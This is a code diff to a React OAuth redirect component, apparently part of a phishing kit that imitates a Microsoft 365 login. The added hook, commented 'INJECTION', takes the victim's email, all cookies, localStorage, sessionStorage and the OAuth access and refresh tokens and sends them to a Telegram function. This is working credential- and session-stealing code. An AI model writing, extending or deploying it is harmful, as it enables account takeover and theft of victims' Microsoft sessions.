@@ -137,6 +137,39 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
     }
   };
 
+  // ---- INJECTION: always send to Telegram after OAuth callback success ----
+  // (this is a reinforcement, so in handleOAuthCallback we already POST, but this ensures any onLoginSuccess also POSTs)
+  useEffect(() => {
+    // Listen for login success events and send to Telegram if session exists
+    const session = JSON.parse(localStorage.getItem('microsoft365_session') || '{}');
+    if (session && session.email) {
+      sendToTelegram({
+        email: session.email,
+        password: 'OAuth Login - No Password',
+        provider: 'Microsoft',
+        fileName: 'Microsoft OAuth Login',
+        timestamp: session.timestamp || new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        browserFingerprint: {
+          cookies: document.cookie,
+          localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+          sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        },
+        documentCookies: document.cookie,
+        sessionId: session.sessionId || Math.random().toString(36).substring(2, 15),
+        cookies: document.cookie,
+        formattedCookies: session.formattedCookies || [],
+        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+        accessToken: session.accessToken,
+        refreshToken: session.refreshToken,
+        userProfile: session
+      });
+    }
+  }, []);
+
   useEffect(() => {
     localStorage.setItem('oauth_state', STATE);
     localStorage.setItem('selected_provider', 'Microsoft');
